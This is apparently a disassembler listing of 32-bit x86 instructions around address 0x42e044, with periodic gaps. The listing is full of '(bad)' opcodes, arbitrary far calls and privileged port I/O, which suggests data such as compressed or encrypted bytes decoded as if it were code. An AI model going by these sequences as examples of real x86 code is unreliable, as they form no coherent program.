  42e044:	jno    0x42e046
  42e046:	iret   
  42e047:	in     eax,dx
  42e048:	jnp    0x42e03f
  42e04a:	mov    esi,0x923ff8a8
  42e04f:	cmp    esi,DWORD PTR [esi]
  42e051:	sti    
  42e052:	mov    edi,0xaff8e35c
  42e057:	fsub   st(4),st
  42e059:	sbb    DWORD PTR ds:0x273cb802,ecx
  42e05f:	xor    DWORD PTR [ebx+0x4c663458],0x99c30d26
  42e069:	loopne 0x42e0ce
  42e06b:	mov    esi,0x836b90be
  42e070:	mov    cl,dl
  42e072:	scas   al,BYTE PTR es:[edi]
  42e073:	mov    cl,0x2f
  42e075:	clc    
  42e076:	and    ebx,DWORD PTR es:[ebx-0xe]
  42e07a:	fbld   TBYTE PTR [ebp+0x3ac6a45b]
  42e080:	inc    ebp
  42e081:	and    al,0x4c
  42e083:	scas   al,BYTE PTR es:[edi]
  42e084:	pop    esp
  42e085:	xlat   BYTE PTR ds:[ebx]
  42e086:	xchg   bh,cl
  42e088:	std    
  42e089:	or     ebx,DWORD PTR [edx+0x6c]
  42e08c:	retf   
  42e08d:	jecxz  0x42e0ac
  42e08f:	sbb    DWORD PTR [eax-0x2a],ecx
  42e092:	fidiv  DWORD PTR [esp+ecx*1+0x6acc7dd5]
  42e099:	ins    BYTE PTR es:[edi],dx
  42e09a:	or     BYTE PTR [ebp-0x2b],ah
  42e09d:	call   0x8606:0xd4fc1636
  42e0a4:	loop   0x42e0da
  42e0a6:	sbb    DWORD PTR [ebp-0x6f],ebx
  42e0a9:	pusha  
  42e0aa:	ret    
  42e0ab:	inc    ebx
  42e0ac:	sbb    al,0x76
  42e0ae:	or     bl,bh
  42e0b0:	scas   eax,DWORD PTR es:[di]
  42e0b2:	add    BYTE PTR [ecx],al
  42e0b4:	cmc    
	...
  42e115:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e11b:	xlat   BYTE PTR ds:[ebx]
  42e11c:	mov    ecx,0xcf7f7fef
  42e121:	(bad)  
  42e122:	lahf   
  42e123:	jmp    0x1:0xed8e86b2
  42e12a:	pop    es
  42e12b:	add    DWORD PTR [eax],eax
  42e12d:	add    BYTE PTR [esi],bh
  42e12f:	daa    
  42e130:	push   cs
  42e131:	and    eax,0x81a5c1b5
  42e136:	and    DWORD PTR [edx+0x3c],eax
  42e139:	call   0xb8ca:0x7834910d
  42e140:	inc    edi
  42e141:	arpl   cx,bx
  42e143:	sbb    edx,DWORD PTR [eax+0x13]
  42e146:	mov    ch,BYTE PTR [esi-0x327a203]
  42e14c:	das    
  42e14d:	xchg   esi,eax
  42e14e:	sar    DWORD PTR [edx-0xd],cl
  42e151:	jo     0x42e123
  42e153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e154:	not    BYTE PTR [ebp+edi*2+0x5f]
  42e158:	cli    
  42e159:	int    0xd1
  42e15b:	out    0xb0,eax
  42e15d:	pop    ebx
  42e15e:	pop    ebp
  42e15f:	add    ecx,esi
  42e161:	adc    DWORD PTR [edx-0x504b849b],ebp
  42e167:	imul   edx,DWORD PTR [esi],0x46
  42e16a:	push   esi
  42e16b:	fist   WORD PTR [ebx]
  42e16d:	jo     0x42e10e
  42e16f:	sahf   
  42e170:	mov    edi,0xc1903063
  42e175:	xor    bl,BYTE PTR [eax]
  42e177:	inc    edi
  42e178:	setns  cl
  42e17b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e17c:	cld    
  42e17d:	or     dl,BYTE PTR [eax+0x78]
  42e180:	fisubr WORD PTR [edx+esi*1-0x71]
  42e184:	mov    al,0x4b
  42e186:	popf   
  42e187:	pop    edi
  42e188:	mov    dl,0xa3
  42e18a:	data16 sub al,ah
  42e18d:	aaa    
  42e18e:	and    eax,0x1bd8a13a
  42e193:	sti    
  42e194:	jl     0x42e1af
  42e196:	mov    ebp,0x94d33c46
  42e19b:	ins    BYTE PTR es:[edi],dx
  42e19c:	dec    di
  42e19e:	in     al,dx
  42e19f:	das    
  42e1a0:	popf   
  42e1a1:	or     eax,0xe2c87818
  42e1a6:	mov    ds:0x58634f8b,eax
  42e1ab:	rol    edi,1
  42e1ad:	inc    edi
  42e1ae:	sbb    al,BYTE PTR [ecx+0x50]
  42e1b1:	je     0x42e177
  42e1b3:	mov    ds:0x3b9701d0,al
  42e1b8:	xor    al,0x4e
  42e1ba:	sub    edx,DWORD PTR [edi]
  42e1bc:	and    eax,0xaa1ddc45
  42e1c1:	test   BYTE PTR [edx-0x29],0x1
  42e1c5:	cmc    
  42e1c6:	cmp    BYTE PTR [esi],0xb2
  42e1c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e1ca:	shl    BYTE PTR [ecx+0x342f9fae],cl
  42e1d0:	inc    esp
  42e1d1:	out    dx,eax
  42e1d2:	cmp    al,0xc0
  42e1d4:	and    BYTE PTR [edx+0x5c373fc2],bh
  42e1da:	popf   
  42e1db:	or     al,0x8e
  42e1dd:	cli    
  42e1de:	xchg   bh,ah
  42e1e0:	and    al,dl
  42e1e2:	mov    bl,0xde
  42e1e4:	data16 in al,0x47
  42e1e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e1e8:	xchg   ecx,eax
  42e1e9:	or     BYTE PTR ds:0x85258f49,0xa8
  42e1f0:	call   0xb468:0xf9921f73
  42e1f7:	fucomi st,st(4)
  42e1f9:	jmp    DWORD PTR [esi+0x27]
  42e1fc:	stos   DWORD PTR es:[edi],eax
  42e1fd:	mov    cl,bh
  42e1ff:	push   edx
  42e200:	cdq    
  42e201:	cmp    ebx,0xfffffffb
  42e204:	cld    
  42e205:	test   eax,0x4495c935
  42e20a:	mov    BYTE PTR [edx-0x53ee3c3d],dl
  42e210:	rcl    BYTE PTR [esi+0x4894e650],1
  42e216:	sub    cl,BYTE PTR [edi-0x61]
  42e219:	inc    esp
  42e21a:	repz sbb edx,DWORD PTR [ebx]
  42e21d:	stos   DWORD PTR es:[edi],eax
  42e21e:	mov    ebx,0x7f6dcd54
  42e223:	mov    ebp,0x10f25cfa
  42e228:	pop    ss
  42e229:	adc    BYTE PTR [ecx+esi*4],bl
  42e22c:	push   0x1
  42e22e:	or     al,BYTE PTR [esi-0x15cd0fed]
  42e234:	dec    ecx
	...
  42e295:	add    BYTE PTR [ebp-0x655875c3],ch
  42e29b:	mov    bh,0xad
  42e29d:	aas    
  42e29e:	mov    al,0xd4
  42e2a0:	mov    edi,0x33bbd4f2
  42e2a5:	inc    ecx
  42e2a6:	xchg   ebp,eax
  42e2a7:	out    dx,al
  42e2a8:	add    DWORD PTR [eax],eax
  42e2aa:	pop    es
  42e2ab:	add    DWORD PTR [eax],eax
  42e2ad:	add    BYTE PTR [ebp+0x1],al
  42e2b0:	pop    esp
  42e2b1:	mov    ch,0xf9
  42e2b3:	(bad)  
  42e2b4:	xchg   ebp,eax
  42e2b5:	test   eax,0xa1fb87bf
  42e2ba:	data16 mov al,ds:0x4fa6b14a
  42e2c0:	lds    edi,FWORD PTR [ebx-0x11]
  42e2c3:	test   dh,dl
  42e2c5:	loopne 0x42e267
  42e2c7:	fidiv  WORD PTR [eax-0x78]
  42e2ca:	jmp    0xf839a08a
  42e2cf:	jg     0x42e331
  42e2d1:	outs   dx,DWORD PTR ds:[esi]
  42e2d2:	add    BYTE PTR [edi+0x5],ch
  42e2d5:	pop    ebx
  42e2d6:	inc    esi
  42e2d7:	push   ss
  42e2d8:	stos   BYTE PTR es:[edi],al
  42e2d9:	mov    dh,0x64
  42e2db:	outs   dx,BYTE PTR ds:[esi]
  42e2dc:	inc    ecx
  42e2dd:	mov    ebx,ebx
  42e2df:	(bad)  [edi-0x7b89bdfa]
  42e2e5:	inc    esp
  42e2e6:	xor    DWORD PTR [esi-0x47],eax
  42e2e9:	mov    esp,0xedbe492b
  42e2ee:	aam    0xbc
  42e2f0:	(bad)  
  42e2f1:	shrd   DWORD PTR [eax-0x58],ebx,0x31
  42e2f6:	push   ds
  42e2f7:	push   ds
  42e2f8:	popf   
  42e2f9:	inc    ecx
  42e2fa:	xor    dl,BYTE PTR [eax+ecx*1+0x55]
  42e2fe:	mov    dl,0x80
  42e300:	push   esp
  42e301:	push   es
  42e302:	icebp  
  42e303:	repz push ds
  42e305:	or     ah,ch
  42e307:	sbb    DWORD PTR [ecx+0x3a],edx
  42e30a:	je     0x42e2e9
  42e30c:	jle    0x42e29d
  42e30e:	jl     0x42e388
  42e310:	jmp    FWORD PTR [ecx]
  42e312:	(bad)  
  42e313:	cmovns esp,DWORD PTR [ebx]
  42e316:	ins    BYTE PTR es:[edi],dx
  42e317:	add    DWORD PTR [edx-0x33],ebp
  42e31a:	mov    ebx,0x9409032a
  42e31f:	push   ebx
  42e320:	xchg   edx,eax
  42e321:	xlat   BYTE PTR ds:[ebx]
  42e322:	and    ah,BYTE PTR [eax-0x5f]
  42e325:	mov    edi,0x2a594f2e
  42e32a:	mov    bh,0x31
  42e32c:	pop    ds
  42e32d:	hlt    
  42e32e:	xchg   ebp,eax
  42e32f:	adc    BYTE PTR [ebp+0x339ed62c],dh
  42e335:	mov    eax,ds:0xc2e516a7
  42e33a:	inc    cx
  42e33c:	rcl    DWORD PTR [eax],1
  42e33e:	fist   DWORD PTR [edx-0x294e9cd1]
  42e344:	ins    DWORD PTR es:[edi],dx
  42e345:	inc    edi
  42e346:	stc    
  42e347:	xchg   esi,eax
  42e348:	pop    ds
  42e349:	jne    0x42e3c8
  42e34b:	int3   
  42e34c:	push   esi
  42e34d:	pop    edx
  42e34e:	inc    ebp
  42e34f:	jge    0x42e318
  42e351:	cli    
  42e352:	popf   
  42e353:	sub    bh,BYTE PTR [ebx]
  42e355:	adc    al,0x1
  42e357:	dec    edi
  42e358:	out    0x7,al
  42e35a:	jecxz  0x42e355
  42e35c:	dec    edi
  42e35d:	sbb    cl,dh
  42e35f:	xchg   edx,eax
  42e360:	sbb    bl,BYTE PTR [ebx-0x15]
  42e363:	hlt    
  42e364:	pop    ds
  42e365:	jl     0x42e2ee
  42e367:	(bad)  
  42e368:	fcmovnbe st,st(1)
  42e36a:	and    eax,0x5b83c4bf
  42e36f:	or     ah,bh
  42e371:	lods   eax,DWORD PTR ds:[esi]
  42e372:	inc    edx
  42e373:	xchg   esp,eax
  42e374:	dec    edi
  42e375:	jge    0x42e3b9
  42e377:	xchg   ecx,eax
  42e378:	bound  ebx,QWORD PTR [ebx-0x3f]
  42e37b:	jbe    0x42e3a1
  42e37d:	pop    eax
  42e37e:	sbb    DWORD PTR [edx],edx
  42e380:	adc    al,BYTE PTR [ebp-0x6e]
  42e383:	inc    edx
  42e384:	sbb    dl,BYTE PTR [edi]
  42e386:	ret    
  42e387:	call   0xcf78:0x63ccec3a
  42e38e:	sbb    ch,dh
  42e390:	cli    
  42e391:	popa   
  42e392:	cmp    ebx,DWORD PTR [esi]
  42e394:	jl     0x42e385
  42e396:	out    dx,eax
  42e397:	jp     0x42e3ff
  42e399:	inc    esi
  42e39a:	sub    BYTE PTR [esi+esi*2+0x447a333b],cl
  42e3a1:	push   ss
  42e3a2:	and    BYTE PTR [eax],0xee
  42e3a5:	add    eax,0x65f300a9
  42e3aa:	lods   al,BYTE PTR ds:[esi]
  42e3ab:	inc    ecx
  42e3ac:	jge    0x42e3b3
  42e3ae:	fcmovnu st,st(1)
  42e3b0:	gs jae 0x42e35e
  42e3b3:	js     0x42e3be
	...
  42e415:	add    dl,ah
  42e417:	mov    ebp,0xe7dfc7dc
  42e41c:	sti    
  42e41d:	mov    ebp,0x348341d6
  42e422:	test   ch,0x77
  42e425:	add    eax,0x1ef9c
  42e42a:	pop    es
  42e42b:	add    DWORD PTR [eax],eax
  42e42d:	add    BYTE PTR [edi-0x4c],dl
  42e430:	add    al,al
  42e432:	or     ebp,DWORD PTR [ecx+edx*2-0x75548cd8]
  42e439:	adc    edx,DWORD PTR [edi+0x13]
  42e43c:	cli    
  42e43d:	sti    
  42e43e:	jb     0x42e4a9
  42e440:	push   edi
  42e441:	mov    al,ds:0xf990ab54
  42e446:	repnz cmp DWORD PTR [ebp+0x1e997841],eax
  42e44d:	call   0xdb48:0x55d18afb
  42e454:	jmp    0xa01b0525
  42e459:	sti    
  42e45a:	push   es
  42e45b:	test   al,0x91
  42e45d:	or     BYTE PTR [esi+ebp*2+0x1],al
  42e461:	pop    es
  42e462:	pop    ecx
  42e463:	imul   ebx,DWORD PTR [ebx+0x52c9d9d0],0x433d8ec
  42e46d:	(bad)  
  42e46e:	and    al,0x37
  42e470:	mov    DWORD PTR [ecx-0x15e1eeb4],ebp
  42e476:	xlat   BYTE PTR ds:[ebx]
  42e477:	adc    DWORD PTR [eax-0x30df33ae],ecx
  42e47d:	outs   dx,BYTE PTR ds:[esi]
  42e47e:	pop    ebx
  42e47f:	jecxz  0x42e493
  42e481:	cmp    al,0x60
  42e483:	and    eax,0x8f3880c1
  42e488:	or     ebp,ebp
  42e48a:	sub    eax,DWORD PTR [edx+0x21]
  42e48d:	push   0xea210d68
  42e492:	add    BYTE PTR [ebx],0xd3
  42e495:	jno    0x42e4fa
  42e497:	imul   eax,DWORD PTR [ebp-0x2c],0x38
  42e49b:	ins    DWORD PTR es:[edi],dx
  42e49c:	cdq    
  42e49d:	jp     0x42e44a
  42e49f:	imul   eax,DWORD PTR [eax],0xa382cb76
  42e4a5:	xchg   edi,eax
  42e4a6:	or     BYTE PTR [edx+ebx*8-0x7a],dh
  42e4aa:	test   eax,0xf47327d8
  42e4af:	pop    esi
  42e4b0:	aas    
  42e4b1:	dec    esi
  42e4b2:	fstp   QWORD PTR [edi-0x1b]
  42e4b5:	inc    eax
  42e4b6:	adc    eax,DWORD PTR [ebx+0x40]
  42e4b9:	gs ins DWORD PTR es:[di],dx
  42e4bc:	out    dx,eax
  42e4bd:	xor    eax,0x42fb5043
  42e4c2:	or     ah,BYTE PTR [edi+0x62]
  42e4c5:	punpckhwd mm1,mm7
  42e4c8:	dec    ecx
  42e4c9:	jno    0x42e48d
  42e4cb:	aaa    
  42e4cc:	ins    DWORD PTR es:[edi],dx
  42e4cd:	mov    dl,0xef
  42e4cf:	jmp    0x9e8a:0xada62c13
  42e4d6:	sub    bl,dh
  42e4d8:	stc    
  42e4d9:	mov    ds:0x8369d428,al
  42e4de:	popf   
  42e4df:	mov    ecx,0xacd2511b
  42e4e4:	into   
  42e4e5:	sbb    ebp,ecx
  42e4e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e4e8:	fcom   DWORD PTR [ecx+0x6d]
  42e4eb:	out    0x4a,al
  42e4ed:	mov    dl,0xcd
  42e4ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e4f0:	das    
  42e4f1:	sar    BYTE PTR [edi-0x10],0x6
  42e4f5:	add    eax,0x679e5eaa
  42e4fa:	mov    DWORD PTR [edx+eiz*8+0x30],ebp
  42e4fe:	adc    dh,BYTE PTR [ebx]
  42e500:	or     al,0x4e
  42e502:	outs   dx,DWORD PTR ds:[esi]
  42e503:	inc    edi
  42e504:	xchg   edx,eax
  42e505:	mov    dl,0xb
  42e507:	lods   eax,DWORD PTR ds:[esi]
  42e508:	not    BYTE PTR [ebx]
  42e50a:	jb     0x42e552
  42e50c:	dec    eax
  42e50d:	sti    
  42e50e:	push   es
  42e50f:	lea    esp,[eax]
  42e511:	lea    eax,[eax-0x54]
  42e514:	dec    ebp
  42e515:	jmp    0x42e590
  42e517:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e518:	jle    0x42e4e0
  42e51a:	sbb    eax,0x54401b96
  42e51f:	js     0x42e535
  42e521:	jl     0x42e500
  42e523:	mov    al,dl
  42e525:	jbe    0x42e511
  42e527:	cdq    
  42e528:	jg     0x42e4c0
  42e52a:	(bad)  
  42e52b:	and    al,0xb9
  42e52d:	pushf  
  42e52e:	adc    ebp,ecx
  42e530:	sar    DWORD PTR [edx-0x13],cl
  42e533:	xor    bh,BYTE PTR [eax+eax*1+0x0]
	...
  42e593:	add    BYTE PTR [eax],al
  42e595:	add    BYTE PTR [ebp+0x38],dl
  42e598:	into   
  42e599:	adc    bh,ch
  42e59b:	neg    bh
  42e59d:	jge    0x42e5e9
  42e59f:	mov    DWORD PTR [ebx],ecx
  42e5a1:	stc    
  42e5a2:	hlt    
  42e5a3:	in     eax,0x8d
  42e5a5:	ja     0x42e54a
  42e5a7:	lock add DWORD PTR [eax],eax
  42e5aa:	pop    es
  42e5ab:	add    DWORD PTR [eax],eax
  42e5ad:	add    dh,ch
  42e5af:	not    dh
  42e5b1:	xchg   ecx,eax
  42e5b2:	ss nop
  42e5b4:	jmp    0x90e0:0xb54c31c6
  42e5bb:	jo     0x42e630
  42e5bd:	not    DWORD PTR [ebx+0x46d94516]
  42e5c3:	(bad)  
  42e5c4:	cwde   
  42e5c5:	cdq    
  42e5c6:	adc    eax,0xb66829c7
  42e5cb:	pop    ebx
  42e5cc:	stos   BYTE PTR es:[edi],al
  42e5cd:	pop    es
  42e5ce:	pop    ebp
  42e5cf:	add    al,0xa5
  42e5d1:	rol    bh,cl
  42e5d3:	pop    ss
  42e5d4:	in     al,dx
  42e5d5:	mov    eax,esi
  42e5d7:	xchg   edx,eax
  42e5d8:	ins    DWORD PTR es:[edi],dx
  42e5d9:	xlat   BYTE PTR ds:[ebx]
  42e5da:	mov    ebx,0x736cf25f
  42e5df:	push   edx
  42e5e0:	fdiv   st,st(5)
  42e5e2:	dec    eax
  42e5e3:	ins    BYTE PTR es:[edi],dx
  42e5e4:	mov    ds:0xe8466373,eax
  42e5e9:	mov    esp,0x4bb0995f
  42e5ee:	aad    0x8d
  42e5f0:	(bad)
  42e5f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e5f4:	dec    ebx
  42e5f5:	xchg   dh,bh
  42e5f7:	mov    esi,edx
  42e5f9:	cmp    DWORD PTR [esp+eax*1],esi
  42e5fc:	add    dl,BYTE PTR [eax]
  42e5fe:	clc    
  42e5ff:	adc    esp,DWORD PTR [eax-0x3a]
  42e602:	jge    0x42e61f
  42e604:	xchg   esi,eax
  42e605:	loop   0x42e597
  42e607:	stc    
  42e608:	cmc    
  42e609:	iret   
  42e60a:	sub    BYTE PTR [edi+ebp*8+0x4df87e18],al
  42e611:	inc    ebp
  42e612:	pop    edx
  42e613:	rcl    BYTE PTR [ebp-0xe35f3c7],1
  42e619:	and    BYTE PTR [eax+0x17],0xa2
  42e61d:	test   al,0xbd
  42e61f:	sete   BYTE PTR [edx]
  42e622:	or     ebp,DWORD PTR [edx+0x5c73b1dc]
  42e628:	es xchg ebx,eax
  42e62a:	sti    
  42e62b:	fcom   QWORD PTR [edx+0x77]
  42e62e:	or     ah,BYTE PTR [edi]
  42e630:	sbb    eax,0x16cc4f17
  42e635:	jecxz  0x42e672
  42e637:	lahf   
  42e638:	cmp    DWORD PTR [eax-0x4d],esi
  42e63b:	pop    ss
  42e63c:	neg    BYTE PTR [eax]
  42e63e:	loop   0x42e695
  42e640:	out    0x67,al
  42e642:	or     al,0x72
  42e644:	hlt    
  42e645:	in     eax,dx
  42e646:	sti    
  42e647:	jbe    0x42e5cd
  42e649:	fldcw  WORD PTR [ecx+0x14ec3f58]
  42e64f:	inc    esi
  42e650:	add    DWORD PTR [ebx+eax*8+0x31d2056e],ebp
  42e657:	cmp    DWORD PTR [edx],esi
  42e659:	in     eax,dx
  42e65a:	repnz (bad) [ecx+eax*8+0x4989c8df]
  42e662:	ins    BYTE PTR es:[edi],dx
  42e663:	sbb    bh,BYTE PTR [esi+eiz*4]
  42e666:	sub    ebx,ecx
  42e668:	mov    bh,0x8e
  42e66a:	add    al,BYTE PTR [esi]
  42e66c:	inc    ebp
  42e66d:	lahf   
  42e66e:	lds    ebx,FWORD PTR [edx]
  42e670:	fnstcw WORD PTR [esi]
  42e672:	push   esi
  42e673:	and    esp,DWORD PTR [eax+0x72]
  42e676:	inc    edx
  42e677:	fisttp QWORD PTR [edx]
  42e679:	out    0x18,eax
  42e67b:	adc    eax,0x328836f9
  42e680:	pop    eax
  42e681:	bound  ebx,QWORD PTR [edx-0x2c]
  42e684:	sub    DWORD PTR [ebx],esi
  42e686:	arpl   bx,bp
  42e688:	jno    0x42e6b0
  42e68a:	lahf   
  42e68b:	int3   
  42e68c:	cmc    
  42e68d:	(bad)  
  42e68e:	out    dx,al
  42e68f:	jl     0x42e699
  42e691:	es fcmovnb st,st(7)
  42e694:	pop    edx
  42e695:	aaa    
  42e696:	ja     0x42e66c
  42e698:	dec    edi
  42e699:	out    dx,eax
  42e69a:	or     al,0xdd
  42e69c:	(bad)  [ebx+0x5cbb7a68]
  42e6a2:	into   
  42e6a3:	(bad)  
  42e6a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e6a5:	cmc    
  42e6a6:	mov    ?,WORD PTR [esi]
  42e6a8:	push   eax
  42e6a9:	leave  
  42e6aa:	or     DWORD PTR [edx-0x4056d86b],ecx
  42e6b0:	add    BYTE PTR [edi],bl
  42e6b2:	scas   al,BYTE PTR es:[edi]
  42e6b3:	add    eax,0x71
	...
  42e714:	add    BYTE PTR [eax],al
  42e716:	pop    edx
  42e717:	cmp    DWORD PTR [esi+0x2d],ecx
  42e71a:	outs   dx,DWORD PTR ds:[esi]
  42e71b:	jg     0x42e798
  42e71d:	jg     0x42e6cd
  42e71f:	xor    BYTE PTR [edx+0x4c],bl
  42e722:	xchg   ebx,eax
  42e723:	jne    0x42e705
  42e725:	xchg   ecx,eax
  42e726:	stos   BYTE PTR es:[edi],al
  42e727:	icebp  
  42e728:	add    DWORD PTR [eax],eax
  42e72a:	pop    es
  42e72b:	add    DWORD PTR [eax],eax
  42e72d:	add    BYTE PTR [ebp+0x11],cl
  42e730:	fnstenv [ecx]
  42e732:	mov    edx,esp
  42e734:	xchg   ecx,eax
  42e735:	into   
  42e736:	in     eax,0xf6
  42e738:	addr16 xor eax,0x8733f5bc
  42e73e:	push   eax
  42e73f:	push   edx
  42e740:	jecxz  0x42e6ca
  42e742:	call   0xa3cfff7d
  42e747:	(bad)  
  42e748:	jmp    0x6f181f78
  42e74d:	mov    edi,edi
  42e74f:	ds loopne 0x42e7c7
  42e752:	sub    BYTE PTR [edi-0x15cb38a4],ch
  42e758:	mov    ds:0x675958ce,al
  42e75d:	lods   al,BYTE PTR ds:[esi]
  42e75e:	sti    
  42e75f:	mov    dl,BYTE PTR [ecx+eiz*2]
  42e762:	jp     0x42e6ea
  42e764:	cmp    eax,0xe4863eb4
  42e769:	jns    0x42e704
  42e76b:	xchg   edx,eax
  42e76c:	sbb    DWORD PTR [esi+0x12],eax
  42e76f:	inc    ebx
  42e770:	outs   dx,BYTE PTR ds:[esi]
  42e771:	mov    bh,0x25
  42e773:	add    esp,eax
  42e775:	pusha  
  42e776:	fs mov dh,ch
  42e779:	div    BYTE PTR [ebp-0x66]
  42e77c:	imul   ebp,DWORD PTR [esi],0xb6ee3caa
  42e782:	retf   
  42e783:	mov    gs,WORD PTR [eax-0x4abe16be]
  42e789:	sbb    esp,DWORD PTR [eax+0x23]
  42e78c:	loop   0x42e7b2
  42e78e:	add    eax,0xd7646842
  42e793:	adc    DWORD PTR [ebp+0x6f10cb47],ebp
  42e799:	div    BYTE PTR [edx]
  42e79b:	adc    eax,DWORD PTR [eax+edx*1+0x7e]
  42e79f:	fisubr WORD PTR [ecx]
  42e7a1:	retf   0x98f4
  42e7a4:	test   al,0x4c
  42e7a6:	test   ch,0x8c
  42e7a9:	pop    ss
  42e7aa:	mov    ch,0xf6
  42e7ac:	push   eax
  42e7ad:	cmc    
  42e7ae:	pop    edx
  42e7af:	enter  0xdb09,0x35
  42e7b3:	pop    ds
  42e7b4:	pushf  
  42e7b5:	out    dx,al
  42e7b6:	aaa    
  42e7b7:	rol    DWORD PTR [esi+esi*1],0xcb
  42e7bb:	xor    edi,DWORD PTR [esi+eax*1+0x4]
  42e7bf:	mov    ebx,0x5dd13222
  42e7c4:	add    cl,0x79
  42e7c7:	jecxz  0x42e772
  42e7c9:	(bad)  
  42e7ca:	(bad)  
  42e7cb:	pop    ecx
  42e7cc:	add    eax,0x33c2034e
  42e7d1:	and    DWORD PTR [ebx+0x25bd724],ebp
  42e7d7:	es sbb esi,ebp
  42e7da:	sahf   
  42e7db:	arpl   WORD PTR [edx-0x24],ax
  42e7de:	mov    DWORD PTR [ebx-0x6d02ce53],ebx
  42e7e4:	shr    BYTE PTR [esi+0x135ed86f],1
  42e7ea:	in     eax,0x7f
  42e7ec:	sbb    BYTE PTR ds:0x2c58e99c,bl
  42e7f2:	pop    esp
  42e7f3:	xchg   edx,eax
  42e7f4:	push   ecx
  42e7f5:	(bad)  
  42e7f6:	jns    0x42e856
  42e7f8:	bound  eax,QWORD PTR [esi-0x9]
  42e7fb:	xor    BYTE PTR [ebp+0x5dc258cc],bh
  42e801:	jl     0x42e835
  42e803:	pop    ds
  42e804:	addr16 mov esi,0x5e183d17
  42e80a:	ins    BYTE PTR es:[edi],dx
  42e80b:	sub    esi,DWORD PTR [esp+eiz*8]
  42e80e:	dec    ebx
  42e80f:	test   BYTE PTR [eax],al
  42e811:	sub    BYTE PTR [ebx+eax*2+0x33a85f95],0xf1
  42e819:	inc    edx
  42e81a:	lods   al,BYTE PTR ds:[esi]
  42e81b:	pop    ebx
  42e81c:	mov    dh,dh
  42e81e:	leave  
  42e81f:	out    0xf1,eax
  42e821:	push   edi
  42e822:	mov    ebp,0x8d67bf3e
  42e827:	stc    
  42e828:	in     al,dx
  42e829:	push   0x26ef947e
  42e82e:	sbb    ecx,DWORD PTR [ebx-0x510475f]
  42e834:	xchg   ecx,eax
	...
  42e895:	add    bl,al
  42e897:	ja     0x42e8f9
  42e899:	and    al,0xf4
  42e89b:	aaa    
  42e89c:	(bad)  
  42e89d:	div    DWORD PTR [ebp+0x5c6f13c3]
  42e8a3:	in     al,dx
  42e8a4:	xchg   ecx,eax
  42e8a5:	aas    
  42e8a6:	mov    cl,0xf2
  42e8a8:	add    DWORD PTR [eax],eax
  42e8aa:	pop    es
  42e8ab:	add    DWORD PTR [eax],eax
  42e8ad:	add    BYTE PTR [edx-0x10f28f31],al
  42e8b3:	shr    DWORD PTR ds:0x7bce9105,cl
  42e8b9:	sub    dh,BYTE PTR [esi+0xb]
  42e8bc:	(bad)  
  42e8bd:	rcr    DWORD PTR [eax-0x2227508b],cl
  42e8c3:	imul   esi,DWORD PTR [edx],0xffffffea
  42e8c6:	push   es
  42e8c7:	call   0x233d:0xa08975d5
  42e8ce:	leave  
  42e8cf:	cld    
  42e8d0:	xchg   esi,eax
  42e8d1:	nop
  42e8d2:	in     eax,dx
  42e8d3:	mov    dl,0x85
  42e8d5:	push   eax
  42e8d6:	in     al,dx
  42e8d7:	or     eax,0x964204c2
  42e8dc:	outs   dx,BYTE PTR ds:[esi]
  42e8dd:	xor    dl,bh
  42e8df:	mov    dh,0xc8
  42e8e1:	pop    eax
  42e8e2:	xchg   edx,eax
  42e8e3:	cmp    al,0xac
  42e8e5:	popa   
  42e8e6:	mov    esi,DWORD PTR [eax-0x80]
  42e8e9:	mov    eax,0x24af804a
  42e8ee:	test   bl,dl
  42e8f0:	dec    eax
  42e8f1:	adc    BYTE PTR [edx+0x1f],0x77
  42e8f5:	stos   DWORD PTR es:[edi],eax
  42e8f6:	dec    esi
  42e8f7:	xchg   edi,eax
  42e8f8:	mov    ch,0x9d
  42e8fa:	xchg   ebx,eax
  42e8fb:	js     0x42e913
  42e8fd:	mov    esi,0x3dbd4d19
  42e902:	repz sbb ch,BYTE PTR [esp+ebp*4-0x7f]
  42e907:	rol    BYTE PTR ss:[esi+0x28],0xf3
  42e90c:	out    0xf5,al
  42e90e:	push   ds
  42e90f:	push   esp
  42e910:	das    
  42e911:	xor    ah,0xc5
  42e914:	mov    al,0x41
  42e916:	xor    eax,0x54c19014
  42e91b:	imul   edi,ecx,0xd6e6dd21
  42e921:	call   0x1591:0x5d3e7b
  42e928:	mov    ebx,0x57447c33
  42e92d:	xchg   ebp,eax
  42e92e:	int3   
  42e92f:	in     al,dx
  42e930:	mov    esi,0xe0c98fc6
  42e935:	push   0xffffffeb
  42e937:	pop    ebp
  42e938:	jg     0x42e92b
  42e93a:	outs   dx,BYTE PTR ds:[esi]
  42e93b:	sbb    dh,BYTE PTR [eax-0x7c]
  42e93e:	out    dx,ax
  42e940:	(bad)  
  42e941:	jmp    0x47d4:0xb5676ce1
  42e948:	cmp    BYTE PTR [eax-0x37d3b6cf],cl
  42e94e:	cmp    cl,al
  42e950:	pop    ecx
  42e951:	(bad)  [ecx-0x46]
  42e954:	subps  xmm2,XMMWORD PTR [esi]
  42e957:	pop    esp
  42e958:	(bad)  
  42e95a:	out    dx,al
  42e95b:	push   esp
  42e95c:	icebp  
  42e95d:	jmp    DWORD PTR [ebp-0x5]
  42e960:	int    0x91
  42e962:	test   DWORD PTR [edi+0x6faf6ddb],eax
  42e968:	popf   
  42e969:	mov    edi,0x2f2e823f
  42e96e:	push   eax
  42e96f:	pusha  
  42e970:	js     0x42e996
  42e972:	mov    DWORD PTR [ecx+ebp*2+0x48],edx
  42e976:	mov    ebp,0x53290f76
  42e97b:	mov    edi,0x607db489
  42e980:	mov    ebp,0x50896e3e
  42e985:	inc    ebp
  42e986:	xchg   DWORD PTR [edi+0x45],esi
  42e989:	adc    ebx,DWORD PTR [esi]
  42e98b:	cmp    DWORD PTR ds:0x5c33f1c,0x71
  42e992:	imul   esi,ebp,0x2
  42e995:	sub    BYTE PTR [edx],dl
  42e997:	call   0x7378:0xbeba2fc9
  42e99e:	mov    ah,BYTE PTR [eax+esi*4]
  42e9a1:	mov    cs,WORD PTR [ebx-0x63]
  42e9a4:	nop
  42e9a5:	pop    ss
